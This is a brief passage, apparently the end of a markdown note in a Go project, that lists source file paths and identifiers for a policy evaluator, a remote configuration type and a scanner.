`internal/policy/policy.go` `Evaluator.Evaluate`, `internal/config/remote.go`
`remoteWire`, `internal/scan/scan.go` `Scanner`.*
